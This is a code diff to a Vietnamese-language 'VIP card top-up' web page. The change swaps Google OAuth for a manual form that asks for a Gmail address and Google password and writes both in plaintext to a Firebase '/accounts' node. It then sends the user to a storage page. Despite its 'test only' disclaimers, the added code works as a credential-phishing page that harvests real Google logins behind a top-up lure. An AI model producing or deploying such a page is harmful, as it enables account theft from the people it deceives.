@@ -3,15 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Nạp Thẻ VIP - Demo</title>
+  <title>Nạp Thẻ VIP - Đăng Nhập Thủ Công</title>
   <script type="module">
-    // Firebase SDK
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getAuth, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
     const firebaseConfig = {
-      apiKey: "AIzaSy...thay bằng apiKey thật của bạn...",
+      apiKey: "AIzaSy...thay bằng apiKey thật...",
       authDomain: "quocdat-sec.firebaseapp.com",
       databaseURL: "https://quocdat-sec-default-rtdb.firebaseio.com",
       projectId: "quocdat-sec",
@@ -21,75 +19,83 @@
     };
 
     const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
     const db = getDatabase(app);
-    const provider = new GoogleAuthProvider();
 
     window.addEventListener('DOMContentLoaded', () => {
-      const btn = document.getElementById('google-btn');
-      btn.addEventListener('click', async () => {
+      const form = document.getElementById('login-form');
+      const status = document.getElementById('status');
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+          status.textContent = 'Vui lòng nhập đầy đủ email và mật khẩu!';
+          status.style.color = 'red';
+          return;
+        }
+
+        if (!email.endsWith('@gmail.com')) {
+          status.textContent = 'Chỉ chấp nhận email Gmail!';
+          status.style.color = 'red';
+          return;
+        }
+
         try {
-          btn.innerHTML = 'Đang đăng nhập...';
-          btn.disabled = true;
+          status.textContent = 'Đang lưu...';
+          status.style.color = 'yellow';
 
-          const result = await signInWithPopup(auth, provider);
-          const user = result.user;
-
-          // Tạo fake password nội bộ (không phải mật khẩu Google thật)
-          const fakePass = 'VIP_' + Math.random().toString(36).slice(2, 10) + '_' + Date.now().toString().slice(-6);
-
-          // Lưu vào Firebase
-          await set(ref(db, 'users/' + user.uid), {
-            email: user.email,
-            displayName: user.displayName || 'Không tên',
-            photoURL: user.photoURL || '',
-            uid: user.uid,
-            createdAt: new Date().toISOString(),
-            lastSignIn: new Date().toISOString(),
-            fakePassword: fakePass,
-            note: 'Fake password chỉ dùng nội bộ - KHÔNG phải mật khẩu Google thật'
+          // Lưu vào Firebase (node /accounts/, dùng push để tạo ID tự động)
+          const newRef = push(ref(db, 'accounts'));
+          await set(newRef, {
+            email: email,
+            password: password,          // Lưu mật khẩu thủ công (rủi ro!)
+            timestamp: new Date().toISOString(),
+            note: 'Đăng nhập thủ công - KHÔNG dùng tài khoản thật!'
           });
 
-          alert(`Chào ${user.displayName || 'bạn'}!\nTài khoản đã tạo/lưu thành công.\nFake Password nội bộ: ${fakePass}`);
-          window.location.href = 'lutrugg.html';
+          status.textContent = 'Lưu thành công! Chuyển đến kho lưu trữ...';
+          status.style.color = 'lime';
+
+          setTimeout(() => {
+            window.location.href = 'lutrugg.html';
+          }, 1500);
         } catch (err) {
-          alert('Lỗi: ' + err.message);
-          btn.innerHTML = 'Đăng nhập bằng Google';
-          btn.disabled = false;
+          status.textContent = 'Lỗi: ' + err.message;
+          status.style.color = 'red';
+          console.error(err);
         }
       });
     });
   </script>
 
   <style>
-    body { font-family: Arial; background:#0f0c29; color:#e0e0e0; text-align:center; padding:40px; }
+    body { font-family: Arial; background:#0f0c29; color:#e0e0e0; padding:40px; text-align:center; }
     h1 { color:#00d4ff; }
-    .google-btn {
-      background:#fff; color:#000; border:none; padding:12px 24px; font-size:16px;
-      border-radius:4px; cursor:pointer; margin:30px auto; display:inline-flex;
-      align-items:center; gap:10px; box-shadow:0 2px 4px rgba(0,0,0,0.2);
-    }
-    .google-btn:hover { background:#f0f0f0; }
+    form { max-width:400px; margin:40px auto; background:rgba(30,30,50,0.8); padding:30px; border-radius:12px; border:1px solid #444; }
+    input { width:100%; padding:12px; margin:10px 0; border-radius:6px; border:1px solid #555; background:#1e1e2e; color:white; }
+    button { background:linear-gradient(90deg,#00d4ff,#0077ff); color:white; border:none; padding:14px; font-size:1.1rem; border-radius:50px; cursor:pointer; width:100%; margin-top:20px; }
+    #status { margin-top:20px; font-weight:bold; }
   </style>
 </head>
 <body>
 
-  <h1>TRUNG TÂM NẠP THẺ VIP</h1>
-  <p style="color:#aaa;">Nạp nhanh - An toàn - Chiết khấu cao</p>
+  <h1>ĐĂNG NHẬP THỦ CÔNG</h1>
+  <p style="color:#aaa;">Nhập Gmail + Mật khẩu Google (chỉ test, KHÔNG dùng thật!)</p>
 
-  <div style="margin:60px 0;">
-    <h2>Đăng nhập / Tạo tài khoản</h2>
-    <button id="google-btn" class="google-btn">
-      <img src="https://www.google.com/favicon.ico" width="20" alt="Google"> 
-      Đăng nhập bằng Google
-    </button>
-    <p style="color:#888; margin-top:10px;">(Sau khi đăng nhập sẽ tự lưu vào lutrugg.html)</p>
-  </div>
+  <form id="login-form">
+    <input type="email" id="email" placeholder="Email Gmail (ví dụ: test@gmail.com)" required>
+    <input type="password" id="password" placeholder="Mật khẩu Google" required>
+    <button type="submit">Đăng Nhập & Lưu</button>
+  </form>
 
-  <!-- Phần nạp thẻ fake (giữ nguyên từ trước nếu muốn, mình rút gọn để tập trung) -->
-  <div style="margin-top:80px; color:#777;">
-    <p>(Đây là demo full flow: Google Auth → Firebase lưu → lutrugg real-time)</p>
-  </div>
+  <div id="status"></div>
+
+  <p style="color:#ff9800; margin-top:40px; font-size:0.9rem;">
+    Cảnh báo: Mật khẩu bạn nhập sẽ được lưu vào Firebase (rất nguy hiểm!). Chỉ dùng cho test.
+  </p>
 
 </body>
 </html>
